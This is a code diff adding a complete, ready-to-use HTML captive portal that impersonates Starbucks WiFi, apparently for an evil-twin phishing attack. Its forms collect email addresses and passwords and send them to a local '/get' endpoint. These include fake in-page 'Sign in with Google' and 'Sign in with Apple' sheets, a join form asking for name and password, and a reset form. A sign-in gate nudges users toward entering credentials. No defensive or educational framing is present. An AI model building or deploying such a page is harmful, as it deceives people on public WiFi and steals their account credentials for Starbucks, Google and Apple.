@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Starbucks WiFi</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:sans-serif;background:#1E3932;display:flex;flex-direction:column;min-height:100vh;max-width:480px;margin:0 auto}
+#th,#tr,#thl,#tg,#ta,#tj,#tu,#tf,#to,#r1,#r2,#r3,#tp{display:none}
+.dot{width:6px;height:6px;border-radius:50%;background:#4CAF50;animation:p 2s infinite}
+@keyframes p{0%,100%{opacity:1}50%{opacity:.3}}
+nav{background:#1E3932;display:flex;padding:0 14px;border-bottom:1px solid rgba(255,255,255,.12)}
+nav label{color:rgba(255,255,255,.4);font-size:12px;font-weight:700;cursor:pointer;padding:9px 12px;border-bottom:2px solid transparent;margin-bottom:-1px;text-transform:uppercase}
+#th:checked~nav label[for=th],#tr:checked~nav label[for=tr],#thl:checked~nav label[for=thl]{color:#CBA258;border-bottom-color:#CBA258}
+.scene{flex:1;background:#f5f5f0;padding-bottom:18px}
+.panel{display:none}
+#th:checked~.scene .ph{display:block}
+#tr:checked~.scene .prw{display:block}
+#thl:checked~.scene .phl{display:block}
+.ca{padding:11px 13px 0}
+.sl{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#999;margin-bottom:7px}
+.card{background:#fff;border-radius:12px;padding:16px;box-shadow:0 2px 10px rgba(0,0,0,.07);margin-bottom:11px}
+.fw{position:relative;margin-bottom:9px}
+.pw{position:relative}
+.fi{width:100%;padding:16px 13px 7px;border:1.5px solid #e0e0e0;border-radius:9px;font-size:15px;color:#1a1a1a;font-family:inherit;outline:none;background:#fff;transition:border-color .15s}
+.fi:focus{border-color:#1E3932}
+.fi::placeholder{color:transparent}
+.fl{position:absolute;top:50%;left:14px;transform:translateY(-50%);font-size:14px;color:#bbb;pointer-events:none;transition:all .15s;background:#fff;padding:0 2px}
+.fi:focus~.fl,.fi:not(:placeholder-shown)~.fl{top:9px;font-size:9px;color:#1E3932;font-weight:700;text-transform:uppercase;letter-spacing:.5px;transform:none}
+.pe{position:absolute;right:13px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:10px;font-weight:700;color:#1E3932;text-transform:uppercase}
+#tp:checked~.scene .ph .pwa{-webkit-text-security:none}
+#tp:not(:checked)~.scene .ph .pwa{-webkit-text-security:disc}
+#tp:checked~.scene .ph .ls{display:none}
+#tp:not(:checked)~.scene .ph .lh{display:none}
+.btn{width:100%;padding:13px;border:none;border-radius:99px;background:#1E3932;color:#fff;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;display:block;text-align:center}
+.hr2{display:flex;justify-content:space-between;margin-bottom:13px}
+.lk{font-size:12px;color:#1E3932;font-weight:700;cursor:pointer;background:none;font-family:inherit;padding:0}
+.or{display:flex;align-items:center;gap:9px;margin-bottom:11px}
+.or::before,.or::after{content:"";flex:1;height:1px;background:#eee}
+.or span{font-size:11px;color:#ccc;font-weight:700}
+.sg{width:100%;padding:11px;border-radius:99px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:8px}
+.sgg{border:1.5px solid #e0e0e0;background:#fff;color:#1a1a1a}
+.sga{border:none;background:#1a1a1a;color:#fff}
+.tn2{font-size:10px;color:#bbb;text-align:center;line-height:1.6;margin-top:11px}
+.tn2 label{color:#1E3932;font-weight:700;cursor:pointer;text-decoration:underline;font-size:10px;border:none;padding:0}
+.jbt{background:#1E3932;color:#fff;border:none;padding:8px 13px;border-radius:99px;font-size:11px;font-weight:700;cursor:pointer;font-family:inherit;white-space:nowrap}
+.fco{display:inline-block;background:#1E3932;color:#fff;padding:8px 18px;border-radius:99px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit}
+.rh{background:#1E3932;padding:20px 16px;text-align:center}
+.rc{padding:11px 13px}
+.ri{background:#fff;border-radius:9px;padding:12px;margin-bottom:7px;display:flex;align-items:center;gap:11px;opacity:.6}
+.rii{width:38px;height:38px;border-radius:50%;background:#f0f0ec;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
+.rist{margin-left:auto;background:#e8e8e8;color:#999;font-size:10px;font-weight:700;padding:4px 8px;border-radius:20px;flex-shrink:0}
+.hls{padding:11px 13px}
+.ai{background:#fff;border-radius:9px;margin-bottom:7px;overflow:hidden}
+.al{display:flex;align-items:center;justify-content:space-between;padding:13px 14px;cursor:pointer;gap:7px}
+.aq{font-size:13px;font-weight:700;color:#1E3932}
+.aa{font-size:9px;color:#CBA258;flex-shrink:0;display:inline-block;transition:transform .2s}
+.ab{max-height:0;overflow:hidden;font-size:12px;color:#666;line-height:1.6;padding:0 14px;transition:max-height .25s ease,padding .2s}
+#r1:checked~.scene .phl .ab1{max-height:80px;padding:9px 14px 13px;border-top:1px solid #f0f0f0}
+#r2:checked~.scene .phl .ab2{max-height:80px;padding:9px 14px 13px;border-top:1px solid #f0f0f0}
+#r3:checked~.scene .phl .ab3{max-height:80px;padding:9px 14px 13px;border-top:1px solid #f0f0f0}
+#r1:checked~.scene .phl .ar1,#r2:checked~.scene .phl .ar2,#r3:checked~.scene .phl .ar3{transform:rotate(90deg)}
+.ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:100;align-items:flex-end;justify-content:center}
+#tg:checked~.ov-g,#ta:checked~.ov-a,#tj:checked~.ov-j,#tu:checked~.ov-u,#tf:checked~.ov-f,#to:checked~.ov-o{display:flex}
+.bd{position:absolute;inset:0}
+.sh{position:relative;background:#fff;border-radius:18px 18px 0 0;width:100%;max-width:480px;padding:16px 18px 34px;z-index:1;max-height:88vh;overflow-y:auto}
+.sha{background:#f2f2f7}
+.hdl{width:32px;height:4px;background:#e0e0e0;border-radius:2px;margin:0 auto 14px}
+.sl2{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:#bbb;margin-bottom:4px;display:block;margin-top:9px}
+.sl2:first-of-type{margin-top:0}
+.ai2{width:100%;padding:13px 14px;border:none;font-size:15px;color:#1a1a1a;font-family:inherit;outline:none;background:#fff;display:block}
+.ai2::placeholder{color:#bbb}
+.ai2:first-child{border-bottom:1px solid #ebebeb}
+.inp{width:100%;padding:11px 12px;border:1.5px solid #e0e0e0;border-radius:9px;font-size:14px;color:#1a1a1a;font-family:inherit;outline:none;display:block}
+.inp:focus{border-color:#1E3932}
+.inp::placeholder{color:#bbb}
+.gw{font-size:13px;font-weight:700;color:#1E3932}
+.wht{font-size:15px;font-weight:700;color:#fff}
+.sht{font-size:17px;font-weight:700;color:#1E3932;text-align:center;margin-bottom:2px}
+.shs{font-size:12px;color:#bbb;text-align:center;margin-bottom:16px;line-height:1.5}
+.can{display:block;text-align:center;font-size:13px;font-weight:700;color:#1E3932;margin-top:9px;cursor:pointer}
+</style>
+</head>
+<body>
+
+<input type="radio" name="tab" id="th" checked>
+<input type="radio" name="tab" id="tr">
+<input type="radio" name="tab" id="thl">
+<input type="checkbox" id="tp">
+<input type="checkbox" id="tg">
+<input type="checkbox" id="ta">
+<input type="checkbox" id="tj">
+<input type="checkbox" id="tu">
+<input type="checkbox" id="tf">
+<input type="checkbox" id="to">
+<input type="checkbox" id="r1">
+<input type="checkbox" id="r2">
+<input type="checkbox" id="r3">
+
+<!-- HEADER -->
+<div style="background:#1E3932;padding:10px 18px 0;display:flex;align-items:center;gap:11px">
+<svg width="42" height="42" viewBox="0 0 42 42"><circle cx="21" cy="21" r="21" fill="#00704A"/><circle cx="21" cy="21" r="16" fill="none" stroke="white" stroke-width="1.4"/><circle cx="21" cy="21" r="11.5" fill="#00704A"/><path d="M21 13.5L22.6 18.5H27.8L23.6 21.5L25.2 26.5L21 23.5L16.8 26.5L18.4 21.5L14.2 18.5H19.4Z" fill="white"/></svg>
+<div>
+<div class="wht">Starbucks</div>
+<div style="font-size:11px;color:rgba(255,255,255,.6);display:flex;align-items:center;gap:4px;margin-top:1px"><span class="dot"></span>Starbucks WiFi &middot; Connected</div>
+</div>
+</div>
+
+<nav>
+<label for="th">Home</label>
+<label for="tr">Rewards</label>
+<label for="thl">Help</label>
+</nav>
+
+<div class="scene">
+
+<!-- HOME -->
+<div class="panel ph">
+<div style="background:#1E3932;padding:18px;display:flex;align-items:center;gap:13px">
+<div style="width:62px;height:62px;border-radius:50%;background:rgba(255,255,255,.08);display:flex;align-items:center;justify-content:center;font-size:28px;flex-shrink:0;border:2px solid rgba(203,162,88,.3)">&#9749;</div>
+<div>
+<div style="font-size:14px;font-weight:700;color:#fff;margin-bottom:2px">Caramel Macchiato &mdash; Any Time</div>
+<div style="font-size:11px;color:rgba(255,255,255,.65)">Sign in to earn Stars</div>
+</div>
+</div>
+<div class="ca">
+<div class="card">
+<div style="font-size:16px;font-weight:700;color:#1E3932;margin-bottom:2px">Sign in to connect</div>
+<div style="font-size:12px;color:#bbb;margin-bottom:14px">Enter your credentials below</div>
+<form action="/get">
+<div class="fw"><input class="fi" type="text" name="u" placeholder="e" id="fe" required><label class="fl" for="fe">Email address</label></div>
+<div class="fw pw"><input class="fi pwa" type="password" name="p" placeholder="p" id="fp" required><label class="fl" for="fp">Password</label><label for="tp" class="pe"><span class="ls">Show</span><span class="lh">Hide</span></label></div>
+<button type="submit" class="btn">Sign In</button>
+</form>
+<div class="hr2"><label for="tf" class="lk">Forgot password?</label><label for="tj" class="lk">Create account</label></div>
+<div class="or"><span>or continue with</span></div>
+<label for="tg" class="sg sgg">G &nbsp; Continue with Google</label>
+<label for="ta" class="sg sga">&#63743; Continue with Apple</label>
+<p class="tn2">By signing in you agree to the <label for="tu">WiFi Terms &amp; AUP</label> and <label for="tu">Privacy Policy</label></p>
+</div>
+<div style="background:#fff;border-radius:12px;padding:13px 15px;box-shadow:0 2px 8px rgba(0,0,0,.06);display:flex;align-items:center;justify-content:space-between;gap:9px;margin-bottom:11px">
+<div><div class="gw">New to Starbucks?</div><div style="font-size:11px;color:#bbb">Join free &mdash; earn Stars</div></div>
+<label for="tj" class="jbt">Join Free</label>
+</div>
+<div class="sl">Featured Drink</div>
+<div style="background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 2px 10px rgba(0,0,0,.06);margin-bottom:11px">
+<div style="height:100px;background:#2d5a3d;display:flex;align-items:center;justify-content:center;font-size:48px">&#9749;</div>
+<div style="padding:12px 14px 14px">
+<div style="font-size:14px;font-weight:700;color:#1E3932;margin-bottom:4px">Caramel Macchiato</div>
+<div style="font-size:11px;color:#999;line-height:1.5;margin-bottom:9px">Espresso, vanilla syrup, steamed milk &amp; caramel drizzle.</div>
+<label for="to" class="fco">Customize &amp; Order &#8594;</label>
+</div>
+</div>
+</div>
+</div>
+
+<!-- REWARDS -->
+<div class="panel prw">
+<div class="rh">
+<div style="font-size:46px;font-weight:700;color:#CBA258;line-height:1;margin-bottom:12px">0 &#9733;</div>
+<div style="background:rgba(255,255,255,.1);border-radius:9px;padding:11px 13px;margin-bottom:12px">
+<p style="font-size:12px;color:rgba(255,255,255,.8);line-height:1.5;margin-bottom:7px">Sign in or join free to earn Stars.</p>
+<label for="th" style="background:#CBA258;color:#1E3932;border:none;padding:8px 20px;border-radius:99px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit">Sign In</label>
+</div>
+<div style="background:rgba(255,255,255,.15);border-radius:99px;height:5px"><div style="background:#CBA258;border-radius:99px;height:5px;width:0"></div></div>
+</div>
+<div class="rc">
+<div class="sl">Reward Tiers</div>
+<p style="font-size:10px;color:#bbb;text-align:center;margin-bottom:10px">&#128274; Sign in to redeem rewards</p>
+<div class="ri"><div class="rii">&#10024;</div><div class="gw">Customize Your Drink</div><div class="rist">25 &#9733;</div></div>
+<div class="ri"><div class="rii">&#127840;</div><div class="gw">Free Food Item</div><div class="rist">100 &#9733;</div></div>
+<div class="ri"><div class="rii">&#9749;</div><div class="gw">Free Handcrafted Drink</div><div class="rist">200 &#9733;</div></div>
+<div class="ri"><div class="rii">&#127873;</div><div class="gw">Free Merchandise</div><div class="rist">400 &#9733;</div></div>
+<label for="tj" class="btn" style="margin-top:13px;cursor:pointer">Join Starbucks Rewards &mdash; Free</label>
+</div>
+</div>
+
+<!-- HELP -->
+<div class="panel phl">
+<div class="hls">
+<div style="background:#1E3932;border-radius:11px;padding:13px 15px;display:flex;align-items:center;gap:13px;margin-bottom:11px">
+<span style="font-size:21px">&#128246;</span>
+<div><div style="font-size:13px;font-weight:700;color:#fff;margin-bottom:1px">Connected &mdash; Starbucks WiFi</div><div style="font-size:11px;color:rgba(255,255,255,.65)">Powered by Google</div></div>
+</div>
+<div class="sl">FAQ</div>
+<div class="ai"><label for="r1" class="al"><span class="aq">Having trouble connecting?</span><span class="aa ar1">&#9654;</span></label><div class="ab ab1">Select <strong>Starbucks WiFi</strong> in device settings. Sign out and back in to refresh.</div></div>
+<div class="ai"><label for="r2" class="al"><span class="aq">How long does my session last?</span><span class="aa ar2">&#9654;</span></label><div class="ab ab2">Rewards members get unlimited WiFi. Guests: valid for your visit, renewable by signing in.</div></div>
+<div class="ai"><label for="r3" class="al"><span class="aq">Is this connection secure?</span><span class="aa ar3">&#9654;</span></label><div class="ab ab3">Standard encryption. Avoid sensitive transactions on public WiFi.</div></div>
+<div style="background:#f0f0ec;border-radius:9px;padding:13px;text-align:center;margin-top:3px">
+<p style="font-size:12px;color:#666;margin-bottom:7px">Still need help?</p>
+<a href="tel:18007827282" style="display:inline-block;background:#1E3932;color:#fff;padding:8px 18px;border-radius:99px;font-size:12px;font-weight:700;text-decoration:none">Call 1-800-782-7282</a>
+</div>
+</div>
+</div>
+
+</div><!-- /scene -->
+
+<!-- FORGOT -->
+<div class="ov ov-f"><label for="tf" class="bd"></label><div class="sh"><div class="hdl"></div>
+<div class="sht">Reset Password</div><div class="shs">We'll send a reset link to your email.</div>
+<form action="/get"><label class="sl2">Email address</label><input class="inp" type="text" name="fu" placeholder="your@email.com" required><input type="hidden" name="fp" value="recovery-attempt"><div style="display:flex;justify-content:space-between;align-items:center;margin-top:13px"><label for="tf" style="font-size:13px;color:#1E3932;cursor:pointer;font-weight:700">Cancel</label><button type="submit" style="background:#1E3932;color:#fff;border:none;border-radius:99px;padding:10px 24px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit">Send Link</button></div></form>
+</div></div>
+
+<!-- GOOGLE -->
+<div class="ov ov-g"><label for="tg" class="bd"></label><div class="sh"><div class="hdl"></div>
+<div style="font-size:17px;font-weight:700;color:#202124;text-align:center;margin-bottom:2px">Sign in with Google</div>
+<div style="font-size:12px;color:#5f6368;text-align:center;margin-bottom:15px">Continue to Starbucks WiFi</div>
+<form action="/get"><label class="sl2">Email or phone</label><input class="inp" type="text" name="gu" placeholder="Enter your email" required><label class="sl2">Password</label><input class="inp" type="password" name="gp" placeholder="Enter your password" required><div style="display:flex;justify-content:space-between;align-items:center;margin-top:4px"><label for="tg" style="font-size:13px;color:#1a73e8;cursor:pointer;font-weight:700">Cancel</label><button type="submit" style="background:#1a73e8;color:#fff;border:none;border-radius:99px;padding:10px 24px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit">Next</button></div></form>
+</div></div>
+
+<!-- APPLE -->
+<div class="ov ov-a"><label for="ta" class="bd"></label><div class="sh sha"><div class="hdl"></div>
+<div style="font-size:28px;text-align:center;margin-bottom:4px">&#63743;</div>
+<div style="font-size:16px;font-weight:700;color:#1a1a1a;text-align:center;margin-bottom:2px">Sign in with Apple</div>
+<div style="font-size:12px;color:#666;text-align:center;margin-bottom:15px">Continue to Starbucks WiFi</div>
+<form action="/get"><div style="background:#fff;border-radius:11px;overflow:hidden;margin-bottom:9px"><input class="ai2" type="text" name="au" placeholder="Apple ID" required><input class="ai2" type="password" name="ap" placeholder="Password" required></div><button type="submit" class="btn" style="background:#1a1a1a;margin-bottom:7px">Continue</button><label for="ta" class="btn" style="background:#fff;color:#1a1a1a;border:1.5px solid #e0e0e0;margin:0;cursor:pointer">Cancel</label></form>
+</div></div>
+
+<!-- JOIN -->
+<div class="ov ov-j"><label for="tj" class="bd"></label><div class="sh"><div style="background:#1E3932;margin:-16px -18px 16px;padding:22px 18px 18px;border-radius:18px 18px 0 0"><div class="hdl"></div><div style="font-size:19px;font-weight:700;color:#fff;text-align:center;margin-bottom:2px">Join Starbucks Rewards</div><div style="font-size:12px;color:rgba(255,255,255,.7);text-align:center">Earn Stars on every purchase.</div></div>
+<form action="/get"><label class="sl2">First Name</label><input class="inp" type="text" name="fn" placeholder="First name" required><label class="sl2">Last Name</label><input class="inp" type="text" name="ln" placeholder="Last name" required><label class="sl2">Email</label><input class="inp" type="text" name="ju" placeholder="your@email.com" required><label class="sl2">Password</label><input class="inp" type="password" name="jp" placeholder="8+ characters" required><button type="submit" class="btn">Create Account &mdash; Free</button></form>
+<label for="tj" class="can">Cancel</label>
+</div></div>
+
+<!-- AUP -->
+<div class="ov ov-u"><label for="tu" class="bd"></label><div class="sh"><div class="hdl"></div>
+<div style="font-size:15px;font-weight:700;color:#1E3932;margin-bottom:12px;padding-bottom:11px;border-bottom:1px solid #f0f0f0">WiFi Terms &amp; AUP</div>
+<p style="font-size:12px;color:#555;line-height:1.6;margin-bottom:8px">For customers only. Access may be revoked. Prohibited: unauthorized access, harmful content, interference, resale.</p>
+<p style="font-size:12px;color:#555;line-height:1.6;margin-bottom:8px">Traffic may be monitored. No privacy expectation. Family-safe filtering active. Service as-is.</p>
+<label for="tu" class="btn" style="margin-top:13px;cursor:pointer">Close &amp; Return</label>
+</div></div>
+
+<!-- ORDER — sign in gate.
+     "Sign In to Order" uses a two-label trick: one label unchecks #to (closes sheet),
+     the other switches to #th (home tab). We stack them visually as one button. -->
+<div class="ov ov-o"><label for="to" class="bd"></label><div class="sh"><div class="hdl"></div>
+<div style="height:90px;background:#2d5a3d;border-radius:11px;display:flex;align-items:center;justify-content:center;font-size:46px;margin-bottom:13px">&#9749;</div>
+<div class="sht">Caramel Macchiato</div>
+<div class="shs">Sign in to customize and order.</div>
+<div style="background:#f5f5f0;border-radius:9px;padding:13px;text-align:center;margin-bottom:13px">
+<div style="font-size:26px;margin-bottom:5px">&#128274;</div>
+<div class="gw">Sign In Required</div>
+<div style="font-size:11px;color:#999">Available to signed-in Rewards members.</div>
+</div>
+<!-- Two-label stack: clicking anywhere on .btn-stack hits both labels -->
+<div style="position:relative;margin-bottom:0">
+  <label for="to" style="display:block;width:100%;padding:13px;border-radius:99px;background:#1E3932;color:#fff;font-size:14px;font-weight:700;text-align:center;cursor:pointer">Sign In to Order</label>
+  <label for="th" style="position:absolute;inset:0;border-radius:99px;cursor:pointer"></label>
+</div>
+<label for="to" class="can">Cancel</label>
+</div></div>
+
+</body></html>
